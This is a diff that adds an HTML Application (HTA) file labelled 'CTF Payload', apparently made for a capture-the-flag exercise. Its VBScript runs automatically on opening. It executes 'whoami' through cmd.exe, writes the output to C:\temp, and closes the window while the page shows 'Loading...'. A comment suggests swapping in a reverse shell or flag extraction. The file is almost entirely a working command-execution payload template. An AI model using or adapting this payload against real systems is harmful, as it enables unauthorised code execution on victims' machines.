@@ -1,0 +1,26 @@
+<html>
+<head>
+<title>CTF Payload</title>
+<HTA:APPLICATION 
+  APPLICATIONNAME="CTFApp"
+  BORDER="thin"
+  BORDERSTYLE="normal"
+  CAPTION="yes"
+  MAXIMIZEBUTTON="yes"
+  MINIMIZEBUTTON="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  WINDOWSTATE="normal"
+/>
+<script language="VBScript">
+  Set objShell = CreateObject("WScript.Shell")
+  objShell.Run "cmd.exe /c whoami > C:\temp\output.txt"
+  ' Or reverse shell, or flag extraction command
+  window.close()
+</script>
+</head>
+<body>
+<h1>Loading...</h1>
+</body>
+</html>
